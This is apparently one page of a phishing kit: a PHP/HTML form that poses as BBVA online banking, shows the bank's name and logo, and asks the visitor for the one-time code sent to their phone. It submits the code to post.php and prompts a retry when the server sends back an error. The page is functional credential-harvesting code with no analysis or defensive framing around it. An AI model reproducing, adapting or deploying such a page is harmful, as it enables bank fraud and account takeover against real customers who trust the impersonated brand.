<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBVA</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
<header class="header">
            <div class="logo">
            <img src="res\img\logoo.png">
            </div>
            <div class="links">
                <a href="#">Acceso a la banca online</a> |
                <a href="#">Ir a BBVA.es</a>
            </div>
        </header>
<main>

    <div class="container">

       
    <h3>Confirmación</h3>
<h4>Ingrese el código enviado a su número de teléfono para continuar.</h4>

            <form action="post.php" method="post">
            <div class="input">
            <input type="text" name="otp" required placeholder="Entrez le code">
           </div>

           
            <?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Código no válido. Por favor inténtalo de nuevo.</p>';
}
?>
                <div class="forg">
                    <button type="submit">Continuar</button>
                </div>
            </form>
       
    </div>
    </main>

</body>
</html>

